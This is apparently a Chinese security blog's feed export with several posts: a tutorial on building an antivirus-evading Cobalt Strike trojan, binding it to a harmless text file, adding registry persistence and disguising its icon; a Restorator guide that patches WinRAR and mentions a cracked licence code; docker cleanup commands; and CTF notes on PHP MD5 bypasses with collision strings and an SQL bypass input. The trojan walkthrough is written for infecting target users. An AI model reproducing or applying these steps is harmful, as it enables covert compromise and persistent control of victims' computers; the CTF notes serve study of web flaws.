        <content type="html"><![CDATA[<h1>免杀木马+文件捆绑+权限伪装</h1><ul><li><p><strong>文章前言</strong></p><p>通过学习使用Cobalt Strike来制作木马，使用摧日对其进行免杀覆盖，使用GoFilebinder对其进行免杀捆绑，最后利用Restorator对其进行图标修改。</p></li><li><p><strong>环境和软件准备</strong></p><p>\1. 一台windows系统的电脑作为攻击机</p><p>2.一台靶机</p><p>3.Cobalt Strike</p><p>4.摧日</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>工具介绍</strong></p><p>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马主要支持C语言的shellcode和纯十六进制的shellcode<br>GoFileBinder：golang免杀捆绑器<br>Restorator：一款修改exe执行程序图标的小工具</p></li><li><p><strong>正文开始</strong></p><p>选用cs中的c格式shellcode，用cs生成一个c语言的相关东西，同时勾选上x64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>完成以上步骤后，接下来便开始对其进行免杀操作，用到的工具摧日对其进行免杀处理</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>使用前请先获取相关工具，并确保已经安装工具所需要的的go环境，至于go环境安装请各位自行查阅本文不在做出相关介绍，安装完毕后进行下一步操作。复制上一步中生成的c文件的中的相关字符，将其另存为一个新的文档，并将该文档与摧日工具的exe文件放在一个目录之中，并运行工具，运行成功后将会得到免杀后的文件hoshino.exe。用相关管家进行查杀后，都可以正常通过。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>然后进行的操作是将这个马和正常的东西捆绑在一起，这个东西可以是可执行文件exe，也可以是文本txt，也可以是文档doc，任何你想的东西都可以进行捆绑。<br>最后实现的效果是：目标用户点击你发送的恶意文件之后会在你的CS客户端上上线，而且目标用户打开的文件可以正常的使用，并且你的木马文件会自动迁移到C:\Users\Public<br>下面将木马和一个txt文本文件进行捆绑：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>将木马和txt文本文件还有GoFileBinder放在同级目录下，运行后得到如下结果，其中新出现的bilibili.exe就是我们要得到的文件</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>进行相关测试，将得到的文件双击后，该文件便会消失，在桌面上打开的便是我们所预设的ceshi.txt，并且我们的原文间将会自动一直到public目录下，cs也显示主机已经上线，至此所有工作已全部完成。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="图片"></p><p>最后一步，权限维持，如果不进行权限维持的话，目标用户在进行电脑重启后便会让改文件关闭，因此便需要用对其增加开机自启的相关操作，其后续路径因为程序会自动移动到public目录下便很好就能设置，</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>最后利用Restorator工具对该文件进行图标美化操作，可以将其伪装成一些较为常见的进程图标，该工具的使用较为方便，本文在这里便不再进行相关的阐述，请自行理解！</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Restorator常见使用方法</title>
      <link href="/posts/1586e22.html"/>
      <url>/posts/1586e22.html</url>
      
        <content type="html"><![CDATA[<h2 id="Restorator常见使用方法有哪些？">Restorator常见使用方法有哪些？</h2><h3 id="案例一：解决WinRAR弹出广告">案例一：解决WinRAR弹出广告</h3><h4 id="1、导出rc文件">1、导出rc文件</h4><p>WinRAR安装完成后，用Restorator 2018打开安装目录WinRAR.exe。点开“打开”对话框后，通过WinRAR的安装路径，找到这个exe程序，然后点击“打开”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第2张"></p><p>Restorator 2018界面主要分为左右两个区，左边是资源树，我们点击“字符串”左边的加号，在展开的项目中，右键点击“中文”，然后选择“导出”→“导出为.rc”，保存到桌面：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第3张"></p><h4 id="2、打开rc文件">2、打开rc文件</h4><p>上一步会导出一个.rc后缀的文件到指定位置。这一步我们去找到这个文件。如下图所示，我将导出的文件命名为“WinRAR导出分析-中文(简体，中-国).rc”，找到它，右键点开菜单后选择“打开方式”，然后用记事本的方式打开它也可以用文本编辑工具（<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>）修改：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第4张"></p><p>注意选择用记事本打开这个.rc文件时，不要勾选“始终用此应用打开.rc文件”。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第5张"></p><h4 id="3、定位弹广代码">3、定位弹广代码</h4><p>这一步很关键。下图就是用记事本打开.rc文件的样子，可以看到每一行都有个序数，后面引号里是一个可执行操作的名字。我们需要找到有关弹窗广告的代码，并用合适的方式覆盖它。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第6张"></p><p>由于WinRAR在不停的更新中，所有新老版本的WinRAR将会有区别。我的WinRAR版本为中文版6.02，涉及弹窗的代码在第1277行。如果你用的WinRAR是其他版本，有可能不是第1277行，但是大致也跑不了1000~1300之间，特征是前后都一、两条网址。由于这个代码行，相对于其他中文还是很明显的，仔细找一下并不是很麻烦。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第7张"></p><h4 id="4、覆盖弹广代码">4、覆盖弹广代码</h4><p>找到弹窗代码后删除，改为</p><blockquote><p>“Reminder dialog information”</p></blockquote><p>注意：要保留引号，逗号等等，格式要与之前保持一致，避免马虎。改好之后，左上菜单选择“文件”→“另存为”，将这个.rc文件保存。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第8张"></p><h4 id="5、导入已保存的-rc文件">5、导入已保存的.rc文件</h4><p>这一步，我们把刚才已保存的.rc文件导入到Restorator 2018。操作与之前类似，先在左侧资源树点“+”展开“字符串”，然后右键点击“中文(xxx)”，菜单中选择“导入”→“导入…”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第9张"></p><p>打开刚才保存的.rc文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第10张"></p><p>此时可以看到Restorator 2018右侧的查看器内，已经是之前.rc的新内容（第1277行代码已经被覆盖），接下来选择“文件”→“另存为”，</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第11张"></p><p>另存为一个新的exe文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第12张"></p><h4 id="6、覆盖源WinRAR-exe文件">6、覆盖源WinRAR.exe文件</h4><p>接下来，我们把这个新WinRAR.exe，粘贴到WinRAR目录，覆盖原安装目录exe同名程序即可大功告成！</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第13张"></p><p>好啦，现在你再启动WinRAR！再也没有弹窗广告了！</p><h3 id="案例二：修改软件标题">案例二：修改软件标题</h3><p>1、首先载入我们需要修改的软件：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第14张"></p><p>2、先更改成“编辑模式”。方法：单机“查看器”——“编辑模式”即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第15张"></p><p>3、在“资源树”里找到“对话框”——“101”，在右侧“标题”修改你希望看到的软件标题栏显示内容。中间的“资源查看器”会有预览。效果图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第16张"></p><p>4、然后在“资源树”里找到“对话框”——“112”这一项。我们只需单击我们想改的文字，在右侧“标题”下方修改即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第17张"></p><p>5、修改完成后的效果如下：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第18张"></p><p>6、然后就是修改图标。这里拿logo来演示！ico图标分辨率为32x32：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第19张"></p><p>7、“资源树”——“图标”——“105”，右击“105”——“导入”——“导入到”，把ZOL导入；接着用同样的方法把图标导入到“108”中：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第20张"></p><p>8、单击查看效果如何：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第21张"></p><p>9、在“资源树”里找到“版本”项：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第22张"></p><p>10、右下方就是我们要修改的内容了。可以把自己的个人信息都写进去：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第23张"></p><h3 id="案例三：修改软件图标">案例三：修改软件图标</h3><p>1、进去主界面后，如果需要填写注册码，打开“汉化说明”这个文本特别信息中的就是注册码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第24张"></p><p>2、打开你要修改的文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第25张"></p><p>3、打开文件后，左侧资源树点击（红1）小三角拉开，把图标项也拉开（红2），现在看到（红3）的是该文件的包含的所有ICON，选中后可以看到图标的信息。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第26张"></p><p>4、选中图标_5000，可以在资源查看器看到ICON的信息（红1），可以看出来这个文件的图标格式是比较多的，往下拉（红2）就可以看到RGB/A的图像信息，目前看到的是16色信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第27张"></p><p>5、256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/A、256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256色、256<em>128</em>96<em>64</em>48<em>32</em>24*16-16色以上是图标项-5000图像信息，替换新的ICON进来时请确保图标信息要和原来的格式/数量一致！</p><p>6、为了达到安全稳定的使用效果，请逐个检查你将要选择替换的ICON项的格式和数量，确保替换一致。</p><p>7、请将你要替换的ico全部放到同一个文件夹里面，并对应图标在应用文件里面的编号（红1），比如：5000对应的是安全，5004对应的是防火墙……（红2）这里是文件游览器，方便我们查看要替换用的ICON。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第28张"></p><p>8、将你要替换的图标整理到同一个文件夹下，然后用文件游览器找到并进入（红2），直到看到所有已经编号好的图标（红1）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第29张"></p><p>9、如果你的准备工作做好了，我们就要开始批量替换图标了。</p><p>10、右键左边资源树的图标项（文件夹图标），选择导入(O)，点击自动导入所有&quot;图标&quot;类型(Z)</p><p>11、导入完后，直接按F12另存为，保存完成了！</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker删除镜像和容器</title>
      <link href="/posts/329caef9.html"/>
      <url>/posts/329caef9.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="优雅删除镜像（推荐做法）">优雅删除镜像（推荐做法）</h2><p>1、查看Docker要删除的镜像，如目标版本为stable-perl的Nginx，镜像ID（IMAGE ID）为 df1998569adb。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>2、使用命令“docker rmi 镜像ID”删除Nginx（stable-perl）的镜像，只取“IMAGE ID”的前3个字符即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi df1</span><br></pre></td></tr></table></figure><p>报错内容如下，意思是镜像（df1）存在使用中的容器（f66），不能强制删除镜像。官方的意思是要先停止容器运行，再进行镜像的删除操作吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: conflict: unable to delete df1998569adb (cannot be forced) - image is being used by running container f6678f2821c7</span><br></pre></td></tr></table></figure><p>3、查看Docker运行中的容器，如容器 nginx:stable-perl ，容器ID为 f66。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>4、先停止nginx:stable-perl容器（f66）运行，再去删除Nginx（stable-perl）镜像（df1）。<br>（1）停止容器（f66）运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop f66</span><br></pre></td></tr></table></figure><p>（2）删除镜像（df1）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi df1</span><br></pre></td></tr></table></figure><p>What？都已经停止容器（f66）运行了，删除镜像（df1）怎么还报错啊！？其实，只停止容器的正常运行还不行，还有最重要的一步没做：删除容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: conflict: unable to delete df1998569adb (must be forced) - image is being used by stopped container f6678f2821c7</span><br></pre></td></tr></table></figure><p>5、查看Docker所有容器的状态（包含运行中的和已停止的），“STATUS”为“Exited(0)”代表停止运行。执行删除容器命令“docker rm f66”，删除 nginx:stable-perl 容器，再查看 nginx:stable-perl 容器是否还在列表中。<br>（1）查看Docker所有容器的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>（2）删除 nginx:stable-perl 容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm f66</span><br></pre></td></tr></table></figure><p>（3）再查看Docker所有容器的状态，发现 nginx:stable-perl 容器（f66）已经不存在了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>6、删除镜像，再查看所有镜像，发现列表中已经不存在版本为stable-perl的Nginx镜像（df1）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi df1</span><br></pre></td></tr></table></figure><h2 id="优雅删除容器（推荐做法）">优雅删除容器（推荐做法）</h2><p>1、查看Docker中运行中的容器，例如 Nginx ，容器ID为 39c，并删除容器。<br>（1）查看Docker中运行中的容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>（2）删除Nginx容器（39c）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 39c</span><br></pre></td></tr></table></figure><p>（3）发现会报错，报错内容如下，意思是容器还在运行，不能删除，先停止运行再删除，或直接强制删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: You cannot remove a running container 39cdb69246fdb6b623cff60af5b59e033149b6940bc5e0432c760ea245da81a9. Stop the container before attempting removal or force remove</span><br></pre></td></tr></table></figure><p>2、停止容器（39c），查看所有容器的运行状态。<br>（1）停止容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 39c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>3、删除容器（39c），查看所有容器的运行状态。<br>（1）删除容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 39c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>（3）容器（39c）已经不存在了，说明被成功删除了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="/posts/cfe09059.html"/>
      <url>/posts/cfe09059.html</url>
      
        <content type="html"><![CDATA[<p>记录网站：【CTF_Web：php弱类型绕过与md5碰撞 - CSDN App】<a href="http://t.csdnimg.cn/A58wf">http://t.csdnimg.cn/A58wf</a></p><h4 id="MD5函数漏洞">MD5函数漏洞</h4><p>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];<br>if (md5($str1) == md5($str2)){<br>die(‘OK’); }</p><p>php弱类型比较产生的漏洞<br>想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过MD5</p><p>编码后0e开头的字符串：<br>QNKCDZO（0e830400451993494058024219903391）<br>aabg7XSs（0e087386482136013740957780965295）<br>aaabEgHn（0e418636035810609803317995275027）<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>还有MD5和双MD5以后的值都是0e开头的<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p><h4 id="md5-数组绕过。">md5()数组绕过。</h4><p>如果我们传入/?name[]=1，那$name的值就是一个数组，name[]=1,2也一样，两个数组进行比较的时候会比较数组内的元素，但md5编码就不一样了，md5()函数统一把数组当成字符串array，这也就导致只要两个都是数组，那他们的md5编码都一样，都为字符串array的md5编码。</p><p>PHP特性<br>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];</p><p>if (md5($str1) === md5($str2)) {<br>die(‘OK’);<br>}</p><p>因为是强类型比较，用0e开头的字符串是没办法绕过的了，但是PHP自身的特性使得可以提交一个数组，<br>而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较了。所以这里用GET传入?str1[]=1&amp;str2[]=2就行了<br>补充：md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$str1和$str2都是数组则双双返回FALSE,<br>两个FALSE相等得以绕过</p><h4 id="MD5碰撞">MD5碰撞</h4><p>$str1 = (string)$_GET[‘str1’];<br>$str2 = (string)$_GET[‘str2’];</p><p>if (md5($str1) === md5($str2)) {<br>die(‘OK’);<br>}</p><p>由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了</p><h4 id="绕过md5-来构造攻击语句">绕过md5()来构造攻击语句</h4><p>select * from ‘admin’ where password=md5($pass,true)</p><h4 id="ffifdyop">ffifdyop</h4><p>这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=‘’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h4 id="md5碰撞（最强解）">md5碰撞（最强解）</h4><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p>$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>以0e开头的原字符串md5后的密文还是以0e开头<br>0e215962017</p><h4 id="超过精确度的弱类型问题">超过精确度的弱类型问题</h4><p>超过精确度的数字(小数点后超过17位)在进行弱类型比较时，会出 现相等的情况。例如var_dump(0.99999999999999999==1)的结果为 True。</p><h4 id="in-arrray-函数">in_arrray()函数</h4><p>in_array()函数的基本格式为:in_array($search,Array())，表示搜索 $search是否为数组Array()的元素。in_array()函数实际上存在第三个参 数，该参数默认为false。如果第三个参数设置为true，则判断$search与 数组的值类型是否相同，即进行强类型比较;若第三个参数设置为 false，则in_array()函数进行判断的时候，会强制将$search的值转换为 数组的值类型，此时就是弱类型比较。</p><h4 id="eregi-函数">eregi()函数</h4><p>eregi()函数用于在一个字符串中搜索指定模式的字符串，搜索时不区分 大小写。<br>关于eregi()函数的考点一般为:eregi()函数可以被%00截断(PHP5版 本，该函数在PHP7中被弃用)。<br>eregi(“111”.substr($input,0,1),“1114”) and substr($input,0,1) !=4<br>该语句要求$input的第一个字符不能为4，但同时要求字符串111与 $input的第一个字符拼接后的结果必须能够匹配字符串1114。按照常 理，这是相互矛盾的，此时可以使用%00来进行输入。请注意，%00在 此处表示一个字符，即\0。之所以会出现截断问题，是因为PHP的底层 是基于C语言实现的，而在C语言里，字符串是以\0作为结尾的。</p><h4 id="md5长度限制强相等">md5长度限制强相等</h4><p>总思路：传相同字符的不同数据类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">    class ctfshow &#123;</span><br><span class="line">        private $d = &#x27;&#x27;;</span><br><span class="line">        private $s = &#x27;&#x27;;</span><br><span class="line">        private $b = &#x27;&#x27;;</span><br><span class="line">        private $ctf = &#x27;&#x27;;</span><br><span class="line"> </span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            $this-&gt;d = (string)$this-&gt;d;</span><br><span class="line">            $this-&gt;s = (string)$this-&gt;s;</span><br><span class="line">            $this-&gt;b = (string)$this-&gt;b;</span><br><span class="line"> </span><br><span class="line">            if (($this-&gt;d != $this-&gt;s) &amp;&amp; ($this-&gt;d != $this-&gt;b) &amp;&amp; ($this-&gt;s != $this-&gt;b)) &#123;</span><br><span class="line">                $dsb = $this-&gt;d.$this-&gt;s.$this-&gt;b;</span><br><span class="line"> </span><br><span class="line">                if ((strlen($dsb) &lt;= 3) &amp;&amp; (strlen($this-&gt;ctf) &lt;= 3)) &#123;</span><br><span class="line">                    if (($dsb !== $this-&gt;ctf) &amp;&amp; ($this-&gt;ctf !== $dsb)) &#123;</span><br><span class="line">                        if (md5($dsb) === md5($this-&gt;ctf)) &#123;</span><br><span class="line">                            echo file_get_contents(&quot;/flag.txt&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    unserialize($_GET[&quot;dsbctf&quot;]);</span><br></pre></td></tr></table></figure><p>1.php浮点数常量NAN和INF：<br>在PHP中，NAN是一个特殊的浮点数值，表示非数值（Not-A-Number）。当一个运算无法计算结果时，比如零除以零，就会产生NAN。<br>PHP中的INF是一个特殊的浮点数值，表示无穷大（Infinity）。当数值超过PHP_FLOAT_MAX或者使用一些数学函数产生极大或极小的结果时，就会得到INF。</p><p><img src="https://i-blog.csdnimg.cn/direct/3274e38e37864a8bab5c7d727b9e087d.png" 